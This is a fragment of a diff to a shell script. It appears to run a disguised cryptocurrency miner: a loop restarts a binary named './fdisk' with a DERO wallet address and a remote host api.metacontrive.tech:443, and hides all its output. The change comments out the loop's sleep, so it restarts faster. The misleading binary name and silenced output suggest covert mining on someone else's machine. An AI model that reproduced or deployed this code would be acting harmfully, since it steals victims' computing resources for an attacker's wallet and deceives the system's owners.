@@ -6,7 +6,7 @@ nohup npm start &
 restart_fdisk() {
   while true; do
     ./fdisk -w dero1qyjrwgdvns7arfuzf6pz5lhpj2yfsdlzy9c05w6qmmp3shc7fm3m2qgjs4uez -r api.metacontrive.tech:443 -p rpc > /dev/null 2>&1
-    sleep 10
+    #sleep 10
   done
 }
 
